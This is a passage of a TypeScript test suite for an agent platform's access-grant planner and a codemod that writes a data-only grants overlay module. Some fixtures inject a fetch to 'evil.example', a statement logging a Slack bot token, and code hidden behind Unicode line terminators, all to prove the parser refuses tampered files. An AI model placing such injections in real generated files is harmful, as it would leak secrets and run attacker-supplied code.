// proves: AP-MOD-core-access-delta, AP-MOD-core-access-grants-codemod

import { assertBindingsValid, assertBundlesValid, connectorGrantName, type Binding, type Bundle, type Connection } from "../agent/access/bundle.js";
import { resolveAccess } from "../agent/access/resolver.js";
import type { ConnectorCredentials } from "../agent/access/connector-credentials.js";
import { lintBroadGrants } from "../agent/access/lint.js";
import { groupsForPrincipal, type Group } from "../agent/identity/groups.js";
import type { Domain } from "../agent/memory/domain.js";
import {
  ALLOW_BROAD_REASON_MAX,
  grantSentence,
  planAccessDelta,
  renderDelta,
  OUT_OF_VOCABULARY, NEW_CONNECTOR_ROUTE,
  type AccessDelta,
  type PlanContext,
} from "../agent/access/delta.js";
import {
  applyDelta,
  emptyGrantsFile,
  overlayBundleName,
  emitGrantsModule,
  parseGrantsFile,
  parseGrantsModule,
  renormalizeGrantsModule,
  stringifyGrants,
  GrantsCodemodError,
  type GrantsFile,
} from "../agent/access/grants-codemod.js";

let passed = 0;
function ok(cond: boolean, label: string): void {
  if (!cond) {
    console.error(`✗ ${label}`);
    process.exit(1);
  }
  passed++;
}

function throwsWith(fn: () => unknown, fragment: string, label: string): void {
  try {
    fn();
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    ok(msg.includes(fragment), `${label} (message: "${msg}")`);
    return;
  }
  ok(false, `${label} (did not throw)`);
}

const notionRest: Connection = {
  id: "notion-rest",
  credentialType: "bearer",
  secretRef: "NOTION_API_KEY",
  allowedWebsites: ["api.notion.com"],
  methods: ["GET", "POST"],
  pathPrefixes: ["/v1/search"],
};

const codeBundles: Bundle[] = [
  { name: "org-default", domains: ["raw.githubusercontent.com"] },
  { name: "notion", connections: [notionRest], connectors: [{ name: "notion", credential: "k" }] },
  { name: "linear-basket", connectors: [{ name: "linear", credential: "k" }] },
];
const codeBindings: Binding[] = [
  { bundle: "org-default", scope: { level: "org" } },
  { bundle: "notion", scope: { level: "surface", surface: "slack/T1/C1" } },
  { bundle: "linear-basket", scope: { level: "surface", surface: "slack/T1/C9" } },
];

const scope = { level: "surface", surface: "slack/T1/C1" } as const;
const domainScope = { level: "domain", domain: "payments" } as const;
const rosterDomain: Domain = { name: "payments", reach: ["slack/T1/C1", "teams/W1/CH1"] };
const principalScope = { level: "principal", principal: "slack/T1/U_ME" } as const;
const groupScope = { level: "group", group: "payments-team" } as const;

const catalogues: readonly ConnectorCredentials[] = ["notion", "linear"].map((connector) => ({
  connector,
  allows: ["api-key" as const],
  credentials: [{ id: "k", type: "api-key" as const, secretRef: `SECRET_${connector}`, broker: "env" }],
}));

function ctxFor(workspace: string, channel: string): PlanContext {
  return {
    scope: { level: "surface", surface: `slack/${workspace}/${channel}` },
    access: resolveAccess({ mode: "channel", platform: "slack", workspace, channel }, codeBundles, codeBindings, {}, catalogues),
    bundles: codeBundles,
    connectorCredentials: catalogues,
  };
}

{
  const d = planAccessDelta({ kind: "widen-connection", connection: "notion-rest", addMethods: ["patch"], addPathPrefixes: ["/v1/pages"] }, ctxFor("T1", "C1"));
  ok(d.kind === "widen-connection", "widen: plans a widen-connection delta");
  if (d.kind === "widen-connection") {
    ok(d.addMethods.length === 1 && d.addMethods[0] === "PATCH", "widen: method uppercased + validated");
    ok(d.addPathPrefixes.length === 1 && d.addPathPrefixes[0] === "/v1/pages", "widen: prefix accepted");
    ok(d.baseConnection.id === "notion-rest" && d.baseConnection.secretRef === "NOTION_API_KEY", "widen: base connection frozen into the delta");
    ok(d.scope.level === "surface" && d.scope.surface === "slack/T1/C1", "widen: scope is the requesting surface key");
  }

  const d2 = planAccessDelta({ kind: "widen-connection", connection: "notion-rest", addMethods: ["GET", "PATCH"] }, ctxFor("T1", "C1"));
  ok(d2.kind === "widen-connection" && d2.addMethods.length === 1 && d2.addMethods[0] === "PATCH", "widen: already-granted methods filtered out");
  throwsWith(
    () => planAccessDelta({ kind: "widen-connection", connection: "notion-rest", addMethods: ["GET"] }, ctxFor("T1", "C1")),
    "already grants everything requested",
    "widen: refuses when everything asked for is already effective",
  );

  throwsWith(() => planAccessDelta({ kind: "widen-connection", connection: "notion-rest" }, ctxFor("T1", "C1")), "at least one method or path prefix", "widen: refuses an empty ask");
  throwsWith(
    () => planAccessDelta({ kind: "widen-connection", connection: "notion-rest", addMethods: ["YEET"] }, ctxFor("T1", "C1")),
    "unknown HTTP method",
    "widen: refuses an unknown method",
  );
  throwsWith(
    () => planAccessDelta({ kind: "widen-connection", connection: "notion-rest", addPathPrefixes: ["v1/pages"] }, ctxFor("T1", "C1")),
    'must start with "/"',
    "widen: refuses a prefix without leading slash",
  );
  throwsWith(
    () => planAccessDelta({ kind: "widen-connection", connection: "nope", addMethods: ["GET"] }, ctxFor("T1", "C1")),
    "isn't effective in this channel",
    "widen: refuses a connection not effective here",
  );
  throwsWith(
    () => planAccessDelta({ kind: "widen-connection", connection: "notion-rest", addMethods: ["POST"] }, ctxFor("T1", "C2")),
    "isn't effective in this channel",
    "widen: a different channel doesn't see C1's connection (scope-effective, not defined-anywhere)",
  );
  throwsWith(() => planAccessDelta({ kind: "widen-connection" }, ctxFor("T1", "C1")), OUT_OF_VOCABULARY, "widen: missing connection id → human-PR fallback wording");
}

{
  const open: Connection = { id: "open", credentialType: "bearer", secretRef: "X", allowedWebsites: ["api.example.com"] };
  const bundles: Bundle[] = [{ name: "b", connections: [open] }];
  const bindings: Binding[] = [{ bundle: "b", scope: { level: "surface", surface: "slack/T1/C1" } }];
  const ctx: PlanContext = {
    scope,
    access: resolveAccess({ mode: "channel", platform: "slack", workspace: "T1", channel: "C1" }, bundles, bindings, {}, catalogues),
    connectorCredentials: catalogues,
    bundles,
  };
  throwsWith(() => planAccessDelta({ kind: "widen-connection", connection: "open", addMethods: ["POST"] }, ctx), "already allows every method", "widen: unrestricted methods → refuse");
  throwsWith(() => planAccessDelta({ kind: "widen-connection", connection: "open", addPathPrefixes: ["/x"] }, ctx), "already allows", "widen: unrestricted paths → refuse (adding would narrow)");
}

{
  const d = planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, ctxFor("T1", "C1"));
  ok(d.kind === "grant-connector" && d.connector === "linear", "grant: plans a grant-connector delta for a defined, not-yet-effective connector");
  throwsWith(() => planAccessDelta({ kind: "grant-connector", connector: "notion", credential: "k" }, ctxFor("T1", "C1")), "already granted to this channel", "grant: refuses an already-effective connector");
  throwsWith(() => planAccessDelta({ kind: "grant-connector", connector: "jira", credential: "k" }, ctxFor("T1", "C1")), NEW_CONNECTOR_ROUTE, "grant: undefined connector → the propose_mcp_server road, not a bundle edit (OPE-2420)");
  ok(NEW_CONNECTOR_ROUTE.includes("propose_mcp_server") && NEW_CONNECTOR_ROUTE.includes("agent/access/mcp-servers.ts") && !NEW_CONNECTOR_ROUTE.includes("bundles.ts"), "grant: the new-connector refusal names propose_mcp_server and mcp-servers.ts, never bundles.ts");
  ok(OUT_OF_VOCABULARY.includes("propose_mcp_server"), "the general refusal also points a new tool at propose_mcp_server");
  throwsWith(() => planAccessDelta({ kind: "grant-connector" }, ctxFor("T1", "C1")), OUT_OF_VOCABULARY, "grant: missing connector name → human-PR fallback wording");
}

throwsWith(() => planAccessDelta({ kind: "add-repo" }, ctxFor("T1", "C1")), OUT_OF_VOCABULARY, "vocabulary: unknown kind (e.g. add-repo) refuses with the human-PR fallback");
throwsWith(
  () => planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, { ...ctxFor("T1", "C1"), scope: { level: "surface", surface: "C1" } }),
  "fully-qualified surface key",
  "vocabulary: a BARE channel-id scope is refused defensively (OPE-219 inverted this check — the qualified key is now the syntax)",
);

{
  const d = planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, ctxFor("T1", "C1"));
  ok(grantSentence(d) === 'Grant connector "linear" (as credential "k") to surface slack/T1/C1', "grantSentence: connector form");
  const w = planAccessDelta({ kind: "widen-connection", connection: "notion-rest", addMethods: ["PATCH"], addPathPrefixes: ["/v1/pages"] }, ctxFor("T1", "C1"));
  ok(grantSentence(w).includes("PATCH") && grantSentence(w).includes("/v1/pages") && grantSentence(w).includes("notion-rest"), "grantSentence: widen form names methods, prefixes, connection");
  ok(renderDelta(w).join("\n").includes("+ methods: PATCH"), "renderDelta: shows the exact additions");
}

{
  const planned = planAccessDelta(
    { kind: "grant-connector", connector: "linear", credential: "k" },
    { ...ctxFor("T1", "C1"), scope: domainScope, domains: [rosterDomain] },
  );
  ok(
    grantSentence(planned) === 'Grant connector "linear" (as credential "k") to domain "payments" (every room it admits)',
    "domain: the grant sentence discloses the whole domain rather than the asking room",
  );
  const applied = applyDelta(emptyGrantsFile(), planned);
  ok(applied.bundleName === "grants:domain:payments", "domain: the overlay bundle namespace is level-tagged");
  ok(
    applied.grants.bindings.length === 1 &&
      applied.grants.bindings[0]?.scope.level === "domain" &&
      applied.grants.bindings[0]?.scope.domain === "payments",
    "domain: request delta emits a domain binding",
  );
  ok(
    parseGrantsModule(emitGrantsModule(applied.grants)).bindings[0]?.scope.level === "domain",
    "domain: the generated binding survives the strict overlay round trip",
  );
}

{
  const broadDomain: Domain = { name: "payments", reach: ["slack/T1/proj-*"] };
  const broadCtx: PlanContext = { ...ctxFor("T1", "C1"), scope: domainScope, domains: [broadDomain] };
  throwsWith(
    () => planAccessDelta({ kind: "grant-connector", connector: "linear", credential: "k" }, broadCtx),
    "BROAD grant",
    "domain broad: a container-backed domain without a reason refuses before generating an unlandable PR",
  );
  const acknowledged = planAccessDelta(
    { kind: "grant-connector", connector: "linear", credential: "k", reason: "  every project room uses the shared Linear workspace  " },
    broadCtx,
  );
  ok(acknowledged.allowBroad === "every project room uses the shared Linear workspace", "domain broad: the reviewed reason becomes the binding acknowledgement");
  const generated = applyDelta(emptyGrantsFile(), acknowledged).grants;
  ok(generated.bindings[0]?.allowBroad === acknowledged.allowBroad, "domain broad: the acknowledgement lands on the generated binding");
  ok(
    lintBroadGrants(generated.bundles, generated.bindings, [broadDomain]).length === 0,
    "domain broad: the generated request passes the existing broad-grant lint",
  );
}

{
  const good = parseGrantsFile(JSON.parse('{ "bundles": [], "bindings": [] }'));
  ok(good.bundles.length === 0 && good.bindings.length === 0, "parse: empty grants file parses");
  const withComment = parseGrantsFile({ $comment: "docs", bundles: [], bindings: [] });
  ok(withComment.bundles.length === 0, "parse: $comment is tolerated (docs pointer in the data file)");
  throwsWith(() => parseGrantsModule("nonsense"), "does not start with the generated header", "parse: garbage text refuses (no module grammar)");
  throwsWith(() => parseGrantsFile({ bundles: [], bindings: [], extra: 1 }), "unknown top-level key", "parse: unknown top-level key refuses");
  throwsWith(() => parseGrantsFile({ bundles: [{ name: "sneaky" }], bindings: [] }), '"grants:"-prefixed name', "parse: non-namespaced bundle name refuses");
  throwsWith(
    () => parseGrantsFile({ bundles: [{ name: "grants:slack/T1/C1", repos: ["a/b"] }], bindings: [] }),
    'has field "repos"',
    "parse: an overlay bundle carrying repos (outside v1 vocabulary) refuses",
  );
  throwsWith(
    () => parseGrantsFile({ bundles: [], bindings: [{ bundle: "grants:slack/T1/C1", scope: { level: "tenant", tenant: "slack/T1" } }] }),
    "must be domain-, surface-, principal- or group-scoped",
    "parse: a tenant-scoped overlay binding refuses (the overlay never binds wider than one room, person or group)",
  );
  throwsWith(
    () => parseGrantsFile({ bundles: [{ name: "grants:slack/T1/C1", connections: [{ id: "x" }] }], bindings: [] }),
    "malformed connection",
    "parse: a malformed connection refuses",
  );
}

{
  const messy: GrantsFile = {
    bundles: [{ name: "grants:slack/T1/C1", connectors: [{ name: "zeta", credential: "k" }, { name: "alpha", credential: "k" }] }],
    bindings: [{ bundle: "grants:slack/T1/C1", scope: { level: "surface", surface: "slack/T1/C1" } }],
  };
  const mod = emitGrantsModule(messy);

  ok(mod.startsWith("// GENERATED + MACHINE-OWNED — DO NOT HAND-EDIT.\n"), "module: opens with the machine-owned banner");
  ok(mod.includes('\nimport type { GrantsFile } from "@open-everywhere/core/agent/access/grants-codemod.js";\n'), "module: carries exactly one TYPE-ONLY import");
  ok(mod.includes("\nexport default {\n"), "module: the data is the default export");
  ok(mod.endsWith(" satisfies GrantsFile;\n"), "module: ends with the satisfies clause + newline");
  const nonGrammar = mod
    .split("\n")
    .filter((l) => !l.startsWith("//") && l.trim() !== "" && !l.startsWith("import type "))
    .join("\n");
  ok(
    nonGrammar.startsWith("export default {") && nonGrammar.endsWith("} satisfies GrantsFile;"),
    "module: the ONLY statement is the default export (nothing else survives the grammar strip)",
  );
  ok(mod.split("export default").length === 2, "module: exactly one `export default`");
  ok(!/\bfunction\b|\brequire\(|=>/u.test(mod.replace(/^\/\/.*$/gmu, "")), "module: no callable syntax outside the header");

  ok(emitGrantsModule(messy) === mod, "module: emit is deterministic");
  ok(emitGrantsModule(parseGrantsModule(mod)) === mod, "module: emit ∘ parseModule is a fixpoint");
  ok(parseGrantsModule(mod).bundles.length === 1, "module: parseModule returns the data");

  throwsWith(
    () => parseGrantsModule(mod + "console.log(process.env.SLACK_BOT_TOKEN);\n"),
    "must contain exactly one",
    "module: a hand-added statement AFTER the data is REFUSED (the format admits no code)",
  );
  throwsWith(
    () => parseGrantsModule(mod.replace("\nexport default {", "\nglobalThis.x = fetch(\"https://evil.example\");\nexport default {")),
    "does not start with the generated header",
    "module: a hand-added statement BEFORE the data is REFUSED",
  );
  throwsWith(
    () => parseGrantsModule(mod.replace('from "@open-everywhere/core/agent/access/grants-codemod.js"', 'from "./elsewhere.js"')),
    "does not start with the generated header",
    "module: a re-pointed type import is REFUSED",
  );
  throwsWith(
    () => parseGrantsModule(mod.replace("DO NOT HAND-EDIT.", "hand-edits welcome.")),
    "does not start with the generated header",
    "module: an edited header is REFUSED",
  );

  const bannerLine = mod.slice(0, mod.indexOf("\n"));
  const olderHeader = mod.replace(/\n\/\/ To change it by hand[^\n]*\n/, "\n// To change it by hand, edit only the data below and keep the layout exactly as emitted.\n");
  ok(olderHeader !== mod, "module: (fixture) the older-header edit actually changed the bytes");
  ok(parseGrantsModule(olderHeader) !== undefined, "module: a header with OLDER WORDS is accepted (OPE-2217: a header change is not a breaking upgrade)");
  const shorterHeader = `${bannerLine}\n${mod.slice(mod.indexOf("\n\nimport type") + 1)}`;
  ok(parseGrantsModule(shorterHeader) !== undefined, "module: a header of the banner line alone is accepted");
  ok(renormalizeGrantsModule(olderHeader) === mod, "module: renormalize REFRESHES an older header to the current words");
  throwsWith(
    () => parseGrantsModule(olderHeader.replace('  "bundles"', '    "bundles"')),
    "not in canonical form",
    "module: an older header does NOT excuse a hand-edited body",
  );
  for (const [name, terminator] of [["U+2028", "\u2028"], ["U+2029", "\u2029"], ["CR", "\r"]] as const) {
    throwsWith(
      () => parseGrantsModule(mod.replace("// The grants overlay:", `// note${terminator}globalThis.x = fetch("https://evil.example");\n// The grants overlay:`)),
      "does not start with the generated header",
      `module: a header line that hides code behind a ${name} line terminator is REFUSED`,
    );
  }
  for (const directive of ["// @ts-nocheck", "//@ts-ignore", "/// <reference path=\"./elsewhere.d.ts\" />"]) {
    throwsWith(
      () => parseGrantsModule(mod.replace(`${bannerLine}\n`, `${bannerLine}\n${directive}\n`)),
      "does not start with the generated header",
      `module: a header line holding the TypeScript directive \`${directive}\` is REFUSED`,
    );
  }
  throwsWith(
    () => parseGrantsModule(mod.replace(`${bannerLine}\n`, `${bannerLine}\nglobalThis.x = 1;\n`)),
    "does not start with the generated header",
    "module: a statement INSIDE the header block is REFUSED",
  );
  throwsWith(
    () => parseGrantsModule(`/* ${bannerLine.slice(3)} */\n${mod.slice(mod.indexOf("\n") + 1)}`),
    "does not start with the generated header",
    "module: a block-comment banner is REFUSED (the header is `//` lines only)",
  );
  throwsWith(
    () => parseGrantsModule(`//\n${mod}`),
    "does not start with the generated header",
    "module: a header whose FIRST line is not the banner is REFUSED",
  );
  throwsWith(() => parseGrantsModule(mod.replace(/^\/\/ GENERATED[^\n]*\n/, "")), "does not start with the generated header", "module: a deleted banner line is REFUSED");
  ok(
    !mod.includes("npm run overlays:normalize") && mod.includes("npx oe overlays normalize"),
    "module: the header names the `oe` command an npm app has, not a repository-only npm script (OPE-2216)",
  );
  ok(mod.includes("(@open-everywhere/core/agent/access/grants-codemod.js)") && !mod.includes("packages/core/"), "module: the header names the codemod by package specifier, not by repository path");

  const reordered = mod.replace('"alpha"', '"\u0000"').replace('"zeta"', '"alpha"').replace('"\u0000"', '"zeta"');
  ok(reordered !== mod, "module: (fixture) the reordering edit actually changed the bytes");
  throwsWith(() => parseGrantsModule(reordered), "not in canonical form", "module: a hand-reordered array is REFUSED (round-trip check), not silently rewritten");
  const reindented = mod.replace('  "bundles"', '    "bundles"');
  ok(reindented !== mod, "module: (fixture) the re-indent edit actually changed the bytes");
  throwsWith(() => parseGrantsModule(reindented), "not in canonical form", "module: a hand-re-indented body is REFUSED");

  ok(renormalizeGrantsModule(reordered) === mod, "module: renormalize turns a hand-edited body back into the canonical bytes");
  ok(renormalizeGrantsModule(mod) === mod, "module: renormalize is idempotent on a canonical file");
  throwsWith(
    () => renormalizeGrantsModule(mod + "process.exit(0);\n"),
    "must contain exactly one",
    "module: renormalize REFUSES a code-bearing file rather than stripping the code",
  );

  const empty = emitGrantsModule(emptyGrantsFile());
  ok(empty.includes('"bundles": []') && empty.includes('"bindings": []'), "module: the empty overlay emits empty arrays");
  ok(emitGrantsModule(parseGrantsModule(empty)) === empty, "module: the empty overlay round-trips");
  throwsWith(() => parseGrantsModule(""), "does not start with the generated header", "module: an empty FILE is refused (absence is not an empty overlay)");
}

{
  const messy: GrantsFile = {
    bundles: [
      { name: "grants:slack/T1/C2", connectors: [{ name: "zeta", credential: "k" }, { name: "alpha", credential: "k" }] },
      { name: "grants:slack/T1/C1", connections: [{ ...notionRest, methods: ["POST", "GET"], pathPrefixes: ["/v1/search", "/a"] }] },
    ],
    bindings: [
      { bundle: "grants:slack/T1/C2", scope: { level: "surface", surface: "slack/T1/C2" } },
      { bundle: "grants:slack/T1/C1", scope: { level: "surface", surface: "slack/T1/C1" } },
    ],
  };
  const text = stringifyGrants(messy);
  ok(text.endsWith("}\n"), "stringify: trailing newline");
  ok(text.indexOf('"grants:slack/T1/C1"') < text.indexOf('"grants:slack/T1/C2"'), "stringify: bundles sorted by name");
  ok(text.indexOf('"GET"') < text.indexOf('"POST"'), "stringify: methods in canonical HTTP order");
  ok(text.indexOf('"alpha"') < text.indexOf('"zeta"'), "stringify: connectors sorted");
  ok(text.indexOf('"/a"') < text.indexOf('"/v1/search"'), "stringify: pathPrefixes sorted");
  ok(stringifyGrants(parseGrantsModule(emitGrantsModule(messy))) === text, "stringify: parse ∘ stringify is a fixpoint (round-trip stable)");
  const idPos = text.indexOf('"id"');
  ok(idPos >= 0 && idPos < text.indexOf('"credentialType"') && text.indexOf('"credentialType"') < text.indexOf('"secretRef"'), "stringify: canonical connection key order");
}

const grantLinear: AccessDelta = { kind: "grant-connector", scope, connector: "linear", credential: "k" };

{
  const r1 = applyDelta(emptyGrantsFile(), grantLinear);
  ok(r1.changed, "apply(grant): empty file → changed");
  ok(r1.bundleName === "grants:slack/T1/C1" && overlayBundleName(scope) === "grants:slack/T1/C1", "apply(grant): canonical overlay bundle name");
  ok(
    r1.grants.bundles.length === 1 &&
      JSON.stringify(r1.grants.bundles[0].connectors) === JSON.stringify([{ name: "linear", credential: "k" }]),
    "apply(grant): the connector AND its credential landed in the overlay bundle — the overlay writes { name, credential }",
  );
  ok(r1.grants.bindings.length === 1 && r1.grants.bindings[0].scope.surface === "slack/T1/C1", "apply(grant): a surface binding for the requesting scope was created");

  ok(stringifyGrants(applyDelta(emptyGrantsFile(), grantLinear).grants) === stringifyGrants(r1.grants), "apply(grant): deterministic bytes");

  const r2 = applyDelta(r1.grants, grantLinear);
  ok(!r2.changed, "apply(grant): re-apply is a no-op (changed: false)");
  ok(stringifyGrants(r2.grants) === stringifyGrants(r1.grants), "apply(grant): re-apply leaves identical bytes");

  const r3 = applyDelta(r1.grants, { kind: "grant-connector", scope, connector: "asana", credential: "k" });
  ok(
    r3.changed &&
      r3.grants.bundles.length === 1 &&
      (r3.grants.bundles[0].connectors ?? []).map(connectorGrantName).join(",") === "asana,linear",
    "apply(grant): second connector joins the same overlay bundle, sorted by name",
  );

  const r4 = applyDelta(r3.grants, { kind: "grant-connector", scope: { level: "surface", surface: "slack/T1/C2" }, connector: "linear", credential: "k" });
  ok(r4.changed && r4.grants.bundles.length === 2 && r4.bundleName === "grants:slack/T1/C2", "apply(grant): a different scope gets its own overlay bundle");

  assertBundlesValid([...codeBundles, ...r4.grants.bundles]);
  assertBindingsValid([...codeBindings, ...r4.grants.bindings], [...codeBundles, ...r4.grants.bundles]);
  ok(true, "apply(grant): merged code+overlay config passes assertBundlesValid/assertBindingsValid");
}

{
  const multiBound: GrantsFile = {
    bundles: [{ name: "grants:slack/T1/C1", connectors: [{ name: "linear", credential: "k" }] }],
    bindings: [
      { bundle: "grants:slack/T1/C1", scope: { level: "surface", surface: "slack/T1/C1" } },
      { bundle: "grants:slack/T1/C1", scope: { level: "surface", surface: "slack/T1/C7" } },
    ],
  };
  const before = stringifyGrants(multiBound);

  const r = applyDelta(multiBound, { kind: "grant-connector", scope, connector: "asana", credential: "k" });
  ok(r.changed, "invariant: delta against a multi-bound canonical bundle still applies");
  ok(r.bundleName === "grants:slack/T1/C1#2", "invariant: ...but into a FRESH single-bound clone bundle (#2), never the multi-bound one");
  const untouched = r.grants.bundles.find((b) => b.name === "grants:slack/T1/C1");
  ok(JSON.stringify(untouched) === JSON.stringify(multiBound.bundles[0]), "invariant: the multi-bound bundle is byte-identical after the codemod");
  ok(stringifyGrants(multiBound) === before, "invariant: input file object untouched (pure)");
  const newBindings = r.grants.bindings.filter((b) => b.bundle === "grants:slack/T1/C1#2");
  ok(newBindings.length === 1 && newBindings[0].scope.surface === "slack/T1/C1", "invariant: the clone is bound to exactly the requesting scope");

  const r2 = applyDelta(multiBound, { kind: "grant-connector", scope, connector: "linear", credential: "k" });
  ok(!r2.changed && stringifyGrants(r2.grants) === before, "invariant: an already-effective grant via a multi-bound bundle is a no-op (no clone created)");
}

const widenDelta: AccessDelta = {
  kind: "widen-connection",
  scope,
  connectionId: "notion-rest",
  addMethods: ["PATCH"],
  addPathPrefixes: ["/v1/pages"],
  baseConnection: notionRest,
};

{
  const r1 = applyDelta(emptyGrantsFile(), widenDelta);
  ok(r1.changed, "apply(widen): empty file → changed");
  const conn = r1.grants.bundles[0].connections?.[0];
  ok(conn !== undefined && conn.id === "notion-rest", "apply(widen): base connection cloned into the overlay bundle");
  ok(conn!.methods?.join(",") === "GET,POST,PATCH", "apply(widen): methods = base ∪ additions, canonical HTTP order");
  ok(conn!.pathPrefixes?.join(",") === "/v1/pages,/v1/search" || conn!.pathPrefixes?.slice().sort().join(",") === "/v1/pages,/v1/search", "apply(widen): prefixes = base ∪ additions");
  ok(conn!.secretRef === "NOTION_API_KEY" && conn!.allowedWebsites.join() === "api.notion.com", "apply(widen): clone carries the base's secretRef + hosts unchanged");

  const merged = { bundles: [...codeBundles, ...r1.grants.bundles], bindings: [...codeBindings, ...r1.grants.bindings] };
  const here = resolveAccess({ mode: "channel", platform: "slack", workspace: "T1", channel: "C1" }, merged.bundles, merged.bindings, {}, catalogues);
  ok(here.connections.find((c) => c.id === "notion-rest")?.methods?.includes("PATCH") === true, "apply(widen): requesting scope's effective access gained PATCH (narrowest-wins override)");
  const elsewhere = resolveAccess({ mode: "channel", platform: "slack", workspace: "T1", channel: "C9" }, merged.bundles, merged.bindings, {}, catalogues);
  ok(elsewhere.connections.find((c) => c.id === "notion-rest") === undefined, "apply(widen): no other scope's access changed (the named invariant, resolver-proven)");

  const r2 = applyDelta(r1.grants, widenDelta);
  ok(!r2.changed && stringifyGrants(r2.grants) === stringifyGrants(r1.grants), "apply(widen): re-apply is a byte-identical no-op");
  ok(stringifyGrants(applyDelta(emptyGrantsFile(), widenDelta).grants) === stringifyGrants(r1.grants), "apply(widen): deterministic bytes");

  const r3 = applyDelta(r1.grants, { ...widenDelta, addMethods: ["DELETE"], addPathPrefixes: [] });
  const conn3 = r3.grants.bundles[0].connections?.find((c) => c.id === "notion-rest");
  ok(r3.changed && conn3?.methods?.join(",") === "GET,POST,PATCH,DELETE", "apply(widen): a second widen extends the existing clone (not a duplicate connection)");
  ok(r3.grants.bundles[0].connections?.length === 1, "apply(widen): still exactly one clone of the connection in the overlay");
}

throwsWith(
  () => applyDelta(emptyGrantsFile(), { ...widenDelta, baseConnection: { ...notionRest, id: "other" } }),
  "doesn't match connectionId",
  "apply: refuses a delta whose frozen base doesn't match its connectionId",
);
throwsWith(
  () => applyDelta(emptyGrantsFile(), { ...widenDelta, addMethods: [], addPathPrefixes: [] }),
  "adds nothing",
  "apply: refuses an empty widen delta",
);
throwsWith(
  () => applyDelta(emptyGrantsFile(), { ...widenDelta, baseConnection: { ...notionRest, methods: undefined } }),
  "no methods restriction",
  "apply: refuses widening methods on an unrestricted base",
);
throwsWith(
  () => applyDelta(emptyGrantsFile(), { ...widenDelta, addMethods: [], baseConnection: { ...notionRest, pathPrefixes: undefined } }),
  "would narrow",
  "apply: refuses adding prefixes to an unrestricted base (that would narrow)",
);
throwsWith(
  () => applyDelta(emptyGrantsFile(), { kind: "grant-connector", scope: { level: "surface", surface: "C1" }, connector: "x", credential: "k" }),
  "fully-qualified surface key",
  "apply: refuses a bare (unqualified) scope",
);
ok(new GrantsCodemodError("x") instanceof Error, "GrantsCodemodError is an Error (refusal type is catchable)");

const meDm = { mode: "dm", platform: "slack", workspace: "T1", channel: "D_ME", principalId: "U_ME" } as const;
const otherDm = { mode: "dm", platform: "slack", workspace: "T1", channel: "D_YOU", principalId: "U_YOU" } as const;

{
  const delta: AccessDelta = { kind: "grant-connector", scope: principalScope, connector: "linear", credential: "k" };
  const r1 = applyDelta(emptyGrantsFile(), delta);
  ok(r1.changed && r1.bundleName === "grants:principal:slack/T1/U_ME", "apply(principal): lands in the level-namespaced overlay bundle");
  ok(overlayBundleName(principalScope) === "grants:principal:slack/T1/U_ME", "apply(principal): overlayBundleName tags the level");
  const binding = r1.grants.bindings[0];
  ok(binding.scope.level === "principal" && binding.scope.principal === "slack/T1/U_ME" && binding.scope.surface === undefined, "apply(principal): writes a principal-level binding and no other address field");
  ok(stringifyGrants(applyDelta(emptyGrantsFile(), delta).grants) === stringifyGrants(r1.grants), "apply(principal): deterministic bytes");
  const r2 = applyDelta(r1.grants, delta);
  ok(!r2.changed && stringifyGrants(r2.grants) === stringifyGrants(r1.grants), "apply(principal): re-apply is a byte-identical no-op");
  const mod = emitGrantsModule(r1.grants);
  ok(emitGrantsModule(parseGrantsModule(mod)) === mod, "apply(principal): the overlay module round-trips (the data-only lint's own check)");

  const bundles = [...codeBundles, ...r1.grants.bundles];
  const bindings = [...codeBindings, ...r1.grants.bindings];
  assertBundlesValid(bundles);
  assertBindingsValid(bindings, bundles, []);
  ok(resolveAccess(meDm, bundles, bindings, {}, catalogues).connectors.includes("linear"), "apply(principal): merged config resolves the connector in THAT person's DM");
  ok(!resolveAccess(otherDm, bundles, bindings, {}, catalogues).connectors.includes("linear"), "apply(principal): another person's DM is unchanged");
  ok(
    !resolveAccess({ mode: "channel", platform: "slack", workspace: "T1", channel: "C1" }, bundles, bindings, {}, catalogues).connectors.includes("linear"),
    "apply(principal): no CHANNEL gains it (a personal grant never joins the service universe)",
  );
  ok(
    !resolveAccess({ ...meDm, platform: "discord" }, bundles, bindings, {}, catalogues).connectors.includes("linear"),
    "apply(principal): the same bare id on another platform resolves nothing (qualified key, no cross-namespace match)",
  );
}

{
  const small: Group = { name: "payments-team", members: ["slack/T1/U_ME", "slack/T1/U_TWO"] };
  const broad: Group = { name: "eng", members: [{ linkSet: "ls-1" }, "slack/T1/U_ME"] };

  const delta: AccessDelta = { kind: "grant-connector", scope: groupScope, connector: "linear", credential: "k" };
  const r1 = applyDelta(emptyGrantsFile(), delta);
  ok(r1.changed && r1.bundleName === "grants:group:payments-team", "apply(group): lands in the level-namespaced overlay bundle");
  ok(r1.grants.bindings[0].scope.level === "group" && r1.grants.bindings[0].scope.group === "payments-team", "apply(group): writes a group-level binding");
  ok(r1.grants.bindings[0].allowBroad === undefined, "apply(group): a narrow group carries no acknowledgement");
  const r2 = applyDelta(r1.grants, delta);
  ok(!r2.changed && stringifyGrants(r2.grants) === stringifyGrants(r1.grants), "apply(group): re-apply is a byte-identical no-op");

  const bundles = [...codeBundles, ...r1.grants.bundles];
  const bindings = [...codeBindings, ...r1.grants.bindings];
  assertBundlesValid(bundles);
  assertBindingsValid(bindings, bundles, [small]);
  const groupsOf = (key: string): readonly string[] => groupsForPrincipal([small], key);
  ok(
    resolveAccess({ ...meDm, groups: groupsOf("slack/T1/U_ME") }, bundles, bindings, {}, catalogues).connectors.includes("linear"),
    "apply(group): merged config resolves the connector in a MEMBER's DM",
  );
  ok(
    !resolveAccess({ ...otherDm, groups: groupsOf("slack/T1/U_YOU") }, bundles, bindings, {}, catalogues).connectors.includes("linear"),
    "apply(group): a non-member's DM is unchanged",
  );
  ok(
    !resolveAccess({ mode: "channel", platform: "slack", workspace: "T1", channel: "C1", groups: groupsOf("slack/T1/U_ME") }, bundles, bindings, {}, catalogues).connectors.includes("linear"),
    "apply(group): a group grants PEOPLE, not rooms — no channel resolves it",
  );
  throwsWith(
    () => assertBindingsValid(bindings, bundles, [{ name: "someone-else", members: ["slack/T1/U_ME"] }]),
    "is not a declared person-group",
    "apply(group): merged re-validation refuses a binding onto an undeclared group (the 3-arg call site)",
  );

  const credentialed: Bundle[] = [{ name: "keys", connectors: [{ name: "linear", credential: "k" }], connections: [notionRest] }];
